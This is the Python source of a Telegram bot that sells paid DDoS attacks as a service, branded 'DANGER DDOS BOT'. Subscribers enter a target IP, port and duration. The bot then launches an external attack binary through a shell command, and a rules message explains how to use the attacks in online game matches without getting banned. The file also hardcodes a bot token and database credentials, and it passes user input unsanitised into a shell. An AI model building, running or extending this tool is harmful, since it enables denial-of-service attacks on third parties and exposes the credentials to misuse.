import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()
TOKEN = '8237142456:AAE0W-p38QV4blmXhOBBIFPGacXl4WvdH5Y'
MONGO_URI = 'mongodb+srv://ihatemosquitos9:JvOK4gNs0SH5SVw9@cluster0.1pd5kt5.mongodb.net/?appName=Cluster0'
CHANNEL_ID = -1002416240231

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['NOOB']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

async def run_attack_command_async(target_ip, target_port, duration, chat_id, username, start_msg_id):
    max_duration = 420
    duration = min(int(duration), max_duration)
    command = f"./m {target_ip} {target_port} {duration}"
        
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)

        # Wait for the attack to complete
        await asyncio.sleep(duration)

        # Delete the start message
        bot.delete_message(chat_id, start_msg_id)

        # Send attack finished message
        finished_msg = bot.send_message(
            chat_id,
            f"*✅ Attack Completed Successfully! ✅\n\n"
            f"📌 **Target:** {target_ip}:{target_port}\n"
            f"⏰ **Duration:** {duration} seconds\n"
            f"👤 **Attacker:** @{username}\n"
            f"🎯 **Status:** Finished 🚀*",
            parse_mode='Markdown'
        )

        # Wait 5 seconds and delete the finished message
        await asyncio.sleep(15)
        bot.delete_message(chat_id, finished_msg.message_id)

    except Exception as e:
        logging.error(f"Failed to execute command: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)
    
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)
def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval*", parse_mode='Markdown')
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()
    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    if action == '/approve':
        if plan == 1:
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Attack limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*✅ User {target_user_id} approved for {plan} days *"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
    
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(
            chat_id,
            "*Please provide the details for the attack in the following format:\n\n`<IP> <Port> <Duration>`*",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid Format\n\nUse `<IP> <Port> <Duration>`*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        if int(duration) > 420:
            bot.send_message(message.chat.id, f"*Maximum attack duration is 7 minutes.*", parse_mode='Markdown')
            return

        username = message.from_user.username

        # Send the start message
        start_msg = bot.send_message(
            message.chat.id,
            f"*🚀 Attack Sent Successfully! 🚀\n\n"
            f"📌 **Target:** {target_ip}:{target_port}\n"
            f"⏰ **Duration:** {duration} seconds\n"
            f"👤 **Attacker:** @{username}*",
            parse_mode='Markdown'
        )

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(target_ip, target_port, duration, message.chat.id, username, start_msg.message_id),
            loop
        )

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    btn1 = KeyboardButton("Attack 🚀")
    btn2 = KeyboardButton("My Info ℹ️")
    btn3 = KeyboardButton("Buy Access! 💰")
    btn4 = KeyboardButton("Rules 🔰")

    markup.add(btn1, btn2, btn3, btn4)

    bot.send_message(message.chat.id, "*🔆 WELCOME TO DANGER DDOS BOT 🔆*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Buy Access! 💰":
        bot.reply_to(message, "* 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 200 INR\n> WEEK - 700 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 1600 INR\n\nDM TO BUY *", parse_mode='Markdown')
    elif message.text == "Attack 🚀":
        attack_command(message)
    elif message.text == "Rules 🔰":
        bot.send_message(message.chat.id, "*🔆 𝐕𝐈𝐏 𝐃𝐃𝐎𝐒 𝐑𝐔??𝐄𝐒 🔆\n\n1. Do ddos in 3 match after play 2 match normal or play 2 tdm match\n2. Do less then 80kills to avoid ban\n3. Dont Run Too Many Attacks !! Cause A Ban From Bot\n4. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot\n5. After 1 or 2 match clear cache of your game \n\n🟢 FOLLOW THIS RULES TO AVOID 1 MONTH BAN 🟢*", parse_mode='Markdown')
    elif message.text == "My Info ℹ️":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            user_id = message.from_user.id
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: @{username}\n"
                        f"USER ID: {user_id}\n"
                        f"PLAN: {plan} days\n"
                        f"METHOD: bgmi ddos*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
